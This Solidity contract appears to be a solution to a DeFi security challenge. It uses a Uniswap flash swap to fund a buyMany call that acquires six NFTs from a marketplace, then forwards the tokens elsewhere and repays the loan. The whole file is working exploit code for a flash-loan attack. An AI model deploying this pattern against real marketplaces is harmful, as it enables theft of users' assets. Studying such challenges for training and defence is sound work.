// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface interfaceFreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface interfaceUniswapPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface interfaceWeth {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function balanceOf(address addr) external returns (uint);
    function transfer(address dst, uint wad) external returns (bool);
}


/**
 * @title FreeRiderNFTMarketplaceAttacker
 */
contract FreeRiderNFTMarketplaceAttacker is IERC721Receiver {

    IERC721 immutable nft;
    interfaceFreeRiderNFTMarketplace immutable market;
    address immutable uniswapPair;
    uint immutable loanAmount;
    uint256 immutable fee;
    interfaceWeth immutable token;
    uint256[] private nfts = [0, 1, 2, 3, 4, 5];
    address to;

    constructor (
        address _nft,
        address _marketplace, 
        address _pair,
        uint _loanAmount,
        uint256 uniswapFee,
        address wethAddress,
        address _to
    ) payable {
        require(msg.value >= uniswapFee,"send ether to pay the fee");
        nft = IERC721(_nft);
        market = interfaceFreeRiderNFTMarketplace(_marketplace);
        uniswapPair = _pair;
        loanAmount = _loanAmount;
        fee = uniswapFee;
        token = interfaceWeth(wethAddress);
        to = _to;
    }


    function attack ()  external {
        console.log("init attack");
        interfaceUniswapPair(uniswapPair).swap(loanAmount,0,address(this), new bytes(1));
        console.log("done attack");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        require(amount0 >= loanAmount,"error in loan");

        console.log("before withdraw");

        uint256 balance = token.balanceOf(address(this));
        console.log("balance: %i", balance / 1 ether);

        token.withdraw(loanAmount);

        console.log("after withdraw");

        console.log("before buy");
        market.buyMany{value: amount0}(nfts);
        console.log("after buy");

        console.log("before transfer");
        for(uint256 i; i < nfts.length; i++){
            nft.safeTransferFrom(address(this),to, nfts[i]);
        }
        console.log("after transfer");

        console.log("before deposit");
        token.deposit{value: address(this).balance}();
        console.log("after deposit");

        console.log("before repayment");
        token.transfer(uniswapPair, loanAmount + fee);
        console.log("after repayment");
    }
    
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {          

        return IERC721Receiver.onERC721Received.selector;
    }
}